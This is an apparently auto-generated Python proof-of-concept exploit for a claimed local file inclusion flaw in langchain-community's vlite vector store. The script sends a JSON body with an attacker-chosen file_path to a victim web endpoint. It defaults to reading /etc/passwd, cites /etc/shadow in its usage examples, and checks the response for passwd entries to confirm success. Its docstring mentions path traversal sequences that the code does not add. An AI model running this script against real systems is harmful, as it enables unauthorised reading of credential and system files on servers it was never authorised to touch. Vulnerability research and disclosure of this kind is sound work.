#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-011
# Sink: add_texts
# Auto-generated — run with: python3 lfi_add_documents_function_vlite_add_texts_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit Script
Vulnerability: Local File Inclusion (LFI) in langchain-community (vlite.py)
CVE/GHSA: N/A (found during adversarial review)

Description:
The `add_documents` function in `/tmp/langchain-community-only/langchain_community/vectorstores/vlite.py`
passes a user-controlled `file_path` keyword argument directly to `vlite.utils.process_file` without any
path sanitisation. An attacker who can control the `kwargs` passed to `from_documents` (e.g. via a web
endpoint that forwards user input to that method) can read arbitrary files on the server's filesystem.

This PoC assumes a remote web service that exposes a vulnerable endpoint (e.g. `/api/v1/trigger`) which
accepts a JSON body with at least a `documents` list and a `file_path` string. When the backend calls
`VLite.from_documents(embeddings, documents, file_path=...)`, the attacker-supplied file path is used
to read a local file.

Usage:
    python3 exploit.py --target http://victim:8000/api/v1/trigger --file /etc/passwd
    python3 exploit.py --target http://localhost:5000/process --file /etc/shadow

Requirements:
    - Python 3.6+
    - requests library (install with `pip install requests`)
"""

import argparse
import sys

try:
    import requests
except ImportError:
    print("[!] requests library is required. Install it with: pip install requests")
    sys.exit(1)


def exploit(target_url: str, file_path: str) -> None:
    """
    Sends a crafted payload to the vulnerable endpoint.

    The payload includes a dummy documents list (required by the API) and the
    attacker-chosen file_path with path traversal sequences. The server will
    attempt to read the specified file and process it through the vlite library.
    """
    # The vulnerable code expects 'documents' and will use kwargs['file_path'].
    # Documents can be a minimal list; their content is ignored if file_path is present.
    payload = {
        "documents": ["dummy_text"],
        "file_path": file_path
    }
    headers = {"Content-Type": "application/json"}

    print(f"[*] Target URL  : {target_url}")
    print(f"[*] File to read: {file_path}")
    print("[*] Sending exploit request...")

    try:
        resp = requests.post(target_url, json=payload, headers=headers, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)

    print(f"[*] HTTP Status : {resp.status_code}")
    print("[*] Response body (truncated to 500 characters):")
    print(resp.text[:500] + ("..." if len(resp.text) > 500 else ""))

    # Check for signs of successful file inclusion (common patterns in /etc/passwd)
    if resp.status_code == 200:
        if "root:" in resp.text or "bin:" in resp.text or "nobody:" in resp.text:
            print("[+] LFI successful! File content appears in the response.")
        else:
            print("[*] The LFI might have succeeded but the file content is not directly visible in the response.")
            print("[*] Check the server logs or attempt to retrieve the ingested data through other endpoints.")
    else:
        print("[*] Unexpected status code. The exploit may have been blocked or the endpoint behaves differently.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="LFI PoC for langchain-community vlite.py"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000/api/v1/trigger",
        help="URL of the vulnerable endpoint (default: http://localhost:8000/api/v1/trigger)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="Path of the file to read (default: /etc/passwd – safe read-only file)"
    )
    args = parser.parse_args()

    exploit(args.target, args.file)
